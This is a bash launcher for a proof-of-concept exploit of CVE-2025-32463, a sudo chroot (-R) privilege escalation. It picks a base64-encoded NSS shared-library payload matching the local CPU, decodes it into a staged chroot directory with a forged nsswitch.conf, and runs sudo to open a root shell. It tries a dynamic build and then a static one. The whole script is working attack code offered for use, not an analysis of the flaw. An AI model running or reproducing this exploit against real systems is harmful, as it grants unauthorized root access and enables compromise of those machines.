#!/bin/bash

# CVE‑2025‑32463 PoC launcher - Karrab
#   - Chooses the correct base‑64 payload for the local CPU
#   - Tries the “dynamic” build first, then falls back to “static”

set -euo pipefail

stage_dir=""

cleanup() {
  if [[ -n "$stage_dir" && -d "$stage_dir" ]]; then
    rm -rf "$stage_dir"
  fi
}
trap cleanup EXIT

detect_arch() {
  local arch
  arch=$(uname -m | tr '[:upper:]' '[:lower:]')
  case "$arch" in
    amd64|x64) echo x86_64 ;;
    i686|i586) echo i386 ;;
    armv8|arm64) echo aarch64 ;;
    *) echo "$arch" ;;
  esac
}

ARCH=$(detect_arch)
HERE=$(dirname "$(readlink -f "$0")")
DIRS=("$HERE/archs-dynamic" "$HERE/archs-static")
B64_NAME="king.${ARCH}.b64"

run_exploit() {
  local payload_b64="$1"
  local label="$2"

  stage_dir=$(mktemp -d /tmp/sudo_king.stage.XXXXXX)
  cd "$stage_dir"

  mkdir -p king/etc libnss_

  echo "$payload_b64" | base64 -d > libnss_/king.so.2
  chmod 755 libnss_/king.so.2

  echo "passwd: /king" > king/etc/nsswitch.conf
  cp /etc/group king/etc/group

  echo "[*] Launching sudo with $label payload …"
  sudo -R king king
  return $?
}

main() {
  echo "[*] Detected architecture: $ARCH"
  for dir in "${DIRS[@]}"; do
    local b64_file="$dir/$B64_NAME"
    local label
    label=$(basename "$dir")

    if [[ ! -f "$b64_file" ]]; then
      echo "[!] Missing payload file: $b64_file"
      continue
    fi

    local payload_b64
    payload_b64=$(< "$b64_file")
    if run_exploit "$payload_b64" "$label"; then
      echo "[+] Exploit succeeded – root shell should be open."
      exit 0
    else
      echo "[!] $label payload failed. Trying next …"
    fi
  done

  echo "[!] All payload variants failed. Check architecture mapping or rebuild."
  exit 1
}

main "$@"
